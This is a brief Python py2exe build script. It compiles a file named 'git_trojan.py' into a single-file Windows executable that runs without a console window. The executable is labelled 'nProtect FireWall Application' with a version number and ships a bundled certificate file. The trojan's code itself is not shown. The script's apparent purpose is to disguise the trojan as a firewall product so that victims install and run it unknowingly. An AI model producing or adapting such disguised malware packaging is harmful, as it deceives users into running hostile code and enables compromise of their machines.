from setuptools import setup
import py2exe

data_files =["cacert.pem"]
setup(name="nProtect FireWall",
      data_files=data_files,
      description="nProtect FireWall Application",
      version="1.0.10.1",
      windows=[{"script" : "git_trojan.py"}],
      #console=["git_trojan.py"],
      options={"py2exe":{"bundle_files":1}},
      zipfile=None
)